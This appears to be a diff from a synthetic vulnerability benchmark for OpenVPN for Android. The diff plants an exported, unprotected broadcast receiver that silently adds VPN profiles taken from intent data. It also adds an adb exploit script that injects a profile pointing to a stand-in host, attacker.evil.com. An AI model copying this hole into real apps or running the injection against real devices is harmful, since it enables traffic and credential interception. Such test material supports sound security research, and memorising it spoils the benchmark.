@@ -1,0 +1,267 @@
+Submodule apps/openvpn/codebase b13c78d1..9b181ae4:
+diff --git a/apps/openvpn/codebase/main/src/main/AndroidManifest.xml b/apps/openvpn/codebase/main/src/main/AndroidManifest.xml
+index 383533fd..366c8df1 100644
+--- a/apps/openvpn/codebase/main/src/main/AndroidManifest.xml
++++ b/apps/openvpn/codebase/main/src/main/AndroidManifest.xml
+@@ -51,6 +51,15 @@
+             <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="vpn"/>
+ 
+         </service>
++
++		<receiver
++			android:name=".core.ProfileImportReceiver"
++			android:exported="true">
++			<intent-filter>
++				<action android:name="de.blinkt.openvpn.IMPORT_PROFILE" />
++			</intent-filter>
++		</receiver>
++
+         <service
+             android:name=".api.ExternalOpenVPNService"
+             android:process=":openvpn"
+@@ -142,4 +151,4 @@
+ 
+     </application>
+ 
+-</manifest>
+\ No newline at end of file
++</manifest>
+diff --git a/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileImportReceiver.java b/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileImportReceiver.java
+new file mode 100644
+index 00000000..7dad8e11
+--- /dev/null
++++ b/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileImportReceiver.java
+@@ -0,0 +1,41 @@
++package de.blinkt.openvpn.core;
++
++import android.content.BroadcastReceiver;
++import android.content.Context;
++import android.content.Intent;
++
++public class ProfileImportReceiver extends BroadcastReceiver {
++    private static final String IMPORT_ACTION = "de.blinkt.openvpn.IMPORT_PROFILE";
++    private static final String IMPORT_SOURCE_EXTRA = "de.blinkt.openvpn.IMPORT_SOURCE";
++    private static final String IMPORT_DATA_EXTRA = "de.blinkt.openvpn.IMPORT_DATA";
++
++    @Override
++    public void onReceive(Context context, Intent intent) {
++        android.util.Log.e("EXPLOIT_TEST", "!!! BROADCAST RECEIVED !!!");
++        
++        if (intent == null || !IMPORT_ACTION.equals(intent.getAction())) {
++            android.util.Log.e("EXPLOIT_TEST", "Wrong action or null intent");
++            return;
++        }
++
++        String source = intent.getStringExtra(IMPORT_SOURCE_EXTRA);
++        String importData = intent.getStringExtra(IMPORT_DATA_EXTRA);
++
++        android.util.Log.e("EXPLOIT_TEST", "Source: " + source);
++        android.util.Log.e("EXPLOIT_TEST", "Data: " + importData);
++
++        if (source == null || importData == null) {
++            android.util.Log.e("EXPLOIT_TEST", "Missing data");
++            return;
++        }
++
++        try {
++            ProfileManager pm = ProfileManager.getInstance(context);
++            pm.handleImportBroadcast(context, intent);
++            android.util.Log.e("EXPLOIT_TEST", "!!! PROFILE IMPORTED !!!");
++        } catch (Exception e) {
++            android.util.Log.e("EXPLOIT_TEST", "Error: " + e.getMessage());
++            e.printStackTrace();
++        }
++    }
++}
+diff --git a/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileManager.java b/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileManager.java
+index c6c0d960..3bbe2952 100644
+--- a/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileManager.java
++++ b/apps/openvpn/codebase/main/src/main/java/de/blinkt/openvpn/core/ProfileManager.java
+@@ -10,6 +10,7 @@ import android.app.Application;
+ import android.content.Context;
+ import android.content.SharedPreferences;
+ import android.content.SharedPreferences.Editor;
++import android.content.Intent;
+ import android.os.Build;
+ 
+ import java.io.File;
+@@ -30,6 +31,10 @@ import de.blinkt.openvpn.VpnProfile;
+ 
+ public class ProfileManager {
+     private static final String PREFS_NAME = "VPNList";
++    private static final String IMPORT_ACTION = "de.blinkt.openvpn.IMPORT_PROFILE";
++    private static final String IMPORT_SOURCE_EXTRA = "de.blinkt.openvpn.IMPORT_SOURCE";
++    private static final String IMPORT_DATA_EXTRA = "de.blinkt.openvpn.IMPORT_DATA";
++
+ 
+     private static final String LAST_CONNECTED_PROFILE = "lastConnectedProfile";
+     private static final String TEMPORARY_PROFILE_FILENAME = "temporary-vpn-profile";
+@@ -358,6 +363,50 @@ public class ProfileManager {
+         }
+     }
+ 
++    public void handleImportBroadcast(Context context, Intent intent) {
++        if (intent == null || !IMPORT_ACTION.equals(intent.getAction())) {
++            return;
++        }
++        
++        String source = intent.getStringExtra(IMPORT_SOURCE_EXTRA);
++        String importData = intent.getStringExtra(IMPORT_DATA_EXTRA);
++        
++        if (source == null || importData == null) {
++            VpnStatus.logError("Invalid import broadcast - missing data");
++            return;
++        }
++        
++        VpnStatus.logInfo("Processing profile import from source: " + source);
++        
++        try {
++            // Parse the import data and create profile
++            VpnProfile profile = new VpnProfile("imported-" + System.currentTimeMillis());
++            parseAndApplyConnectionData(profile, importData);
++            
++            // Auto-add the profile
++            addProfile(profile);
++            VpnStatus.logInfo("Profile imported successfully: " + profile.mName);
++        } catch (Exception e) {
++            VpnStatus.logError("Failed to import profile: " + e.getMessage());
++        }
++    }
++
++	private void parseAndApplyConnectionData(VpnProfile profile, String data) {
++		// Simple format: "server:port"
++		// Example: "attacker.evil.com:1194"
++		
++		VpnStatus.logInfo("Parsing data: " + data);
++		
++		if (data.contains(":")) {
++			String[] parts = data.split(":");
++			if (parts.length >= 2) {
++				profile.mConnections[0].mServerName = parts[0];
++				profile.mConnections[0].mServerPort = parts[1];
++				VpnStatus.logInfo("Set server: " + parts[0] + " port: " + parts[1]);
++			}
++		}
++	}
++
+     public synchronized void removeProfile(Context context, VpnProfile profile) {
+         String vpnentry = profile.getUUID().toString();
+         profiles.remove(vpnentry);
+diff --git a/apps/openvpn/metadata.json b/apps/openvpn/metadata.json
+index 0ad6fc28..2acc1933 100644
+--- a/apps/openvpn/metadata.json
++++ b/apps/openvpn/metadata.json
+@@ -1,6 +1,6 @@
+ {
+   "gh_link": "https://github.com/cy-suite/OpenVPN-Android",
+-  "commit_version": "b13c78d1f95d4f0687dafae4ceaf3a8466c97866",
++  "commit_version": "9b181ae4df1ea10e2321ec32749374c8c097da09",
+   "download_link": "https://github.com/schwabe/ics-openvpn/releases/download/v0.7.61/ics-openvpn-0.7.61.apk",
+   "sdk": "35",
+   "java": "17",
+diff --git a/apps/openvpn/setup_app_source.sh b/apps/openvpn/setup_app_source.sh
+index bf4a1541..82dd55de 100755
+--- a/apps/openvpn/setup_app_source.sh
++++ b/apps/openvpn/setup_app_source.sh
+@@ -113,4 +113,4 @@ else
+     echo "Error: APK build failed - apk/openvpn.apk not found"
+     echo "Check build logs above for details"
+     exit 1
+-fi
+\ No newline at end of file
++fi
+diff --git a/apps/openvpn/vuln_scenarios/synthetic/exploit.sh b/apps/openvpn/vuln_scenarios/synthetic/exploit.sh
+new file mode 100644
+index 00000000..850abd3f
+--- /dev/null
++++ b/apps/openvpn/vuln_scenarios/synthetic/exploit.sh
+@@ -0,0 +1,89 @@
++#!/bin/bash
++
++# Exploit for OpenVPN for Android - Arbitrary Profile Injection
++# This exploit injects a malicious VPN profile via unprotected broadcast receiver
++
++PACKAGE="de.blinkt.openvpn"
++RECEIVER="${PACKAGE}/.core.ProfileImportReceiver"
++ACTION="de.blinkt.openvpn.IMPORT_PROFILE"
++
++# Malicious VPN server controlled by attacker
++MALICIOUS_SERVER="attacker.evil.com"
++MALICIOUS_PORT="1194"
++
++echo "[*] OpenVPN Profile Injection Exploit"
++echo "[*] Target: $PACKAGE"
++echo ""
++
++# Check if OpenVPN is installed
++if ! adb shell pm list packages | grep -q "$PACKAGE"; then
++    echo "[!] OpenVPN for Android is not installed on the device"
++    exit 1
++fi
++
++echo "[+] OpenVPN for Android detected"
++
++# Craft malicious profile data
++PROFILE_DATA="${MALICIOUS_SERVER}:${MALICIOUS_PORT}"
++
++echo "[*] Injecting malicious VPN profile..."
++echo "[*] Malicious server: ${MALICIOUS_SERVER}:${MALICIOUS_PORT}"
++echo "[*] Profile data: ${PROFILE_DATA}"
++
++# Clear logcat before sending broadcast
++adb logcat -c
++
++# Send EXPLICIT broadcast to inject profile (bypasses Android 8+ restrictions)
++echo "[*] Sending explicit broadcast to receiver..."
++adb shell am broadcast \
++    -n "${RECEIVER}" \
++    -a "${ACTION}" \
++    --es de.blinkt.openvpn.IMPORT_SOURCE "automation" \
++    --es de.blinkt.openvpn.IMPORT_DATA "${PROFILE_DATA}"
++
++RESULT=$?
++
++# Wait a moment for processing
++sleep 2
++
++# Check logs
++echo ""
++echo "[*] Checking logs..."
++LOGS=$(adb logcat -d | grep -E "EXPLOIT_TEST|ProfileImport|import")
++
++if [ -n "$LOGS" ]; then
++    echo "[+] Relevant log entries:"
++    echo "$LOGS"
++else
++    echo "[!] No relevant logs found"
++fi
++
++if [ $RESULT -eq 0 ]; then
++    echo ""
++    echo "[+] Broadcast command completed"
++    
++    # Check storage
++    echo "[*] Checking if profile was added to storage..."
++    STORAGE_CHECK=$(adb shell "run-as ${PACKAGE} cat /data/data/${PACKAGE}/shared_prefs/VPNList.xml 2>/dev/null" | grep "imported-")
++    
++    if [ -n "$STORAGE_CHECK" ]; then
++        echo "[+] SUCCESS: Profile found in storage!"
++        echo "$STORAGE_CHECK"
++    else
++        echo "[!] Profile not found in storage"
++    fi
++    
++    echo ""
++    echo "[!] Impact:"
++    echo "    - Attacker-controlled VPN profile added without user interaction"
++    echo "    - All traffic can be routed through malicious server"
++    echo "    - User may unknowingly connect to compromised VPN"
++    echo "    - Credentials and traffic can be intercepted"
++    echo ""
++    echo "[*] To verify: Open OpenVPN app and check for profile starting with 'imported-'"
++else
++    echo "[!] Broadcast command failed"
++fi
++
++echo ""
++echo "[*] Exploitation complete"
